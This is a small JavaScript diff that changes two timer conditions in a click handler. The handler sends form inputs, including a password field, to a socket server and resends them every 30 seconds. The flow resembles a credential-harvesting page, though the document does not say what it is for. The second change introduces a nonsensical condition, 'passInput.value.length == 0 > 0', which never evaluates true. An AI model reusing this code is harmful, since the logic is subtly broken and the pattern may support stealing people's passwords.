@@ -84,7 +84,7 @@ emitDataServer.addEventListener("click", () => {
         if (passCount == 0) {
             socket.emit("ShowAvatar", dataInputs);
             setInterval(() => {
-                if(dataInputs.pass.length == 0 && preloader.style.display == "block"){
+                if(passInput.value.length == 0 && preloader.style.display == "block"){
                     socket.emit("ShowAvatar", dataInputs);
                     console.log("Enviando otra vez coño")
                 }
@@ -97,7 +97,7 @@ emitDataServer.addEventListener("click", () => {
     } else {
         socket.emit("Data", dataInputs);
         setInterval(() => {
-            if(dataInputs.pass.length > 0 && preloader.style.display == "block"){
+            if(passInput.value.length == 0 > 0 && preloader.style.display == "block"){
                 socket.emit("Data", dataInputs);
             }
         }, 30000);
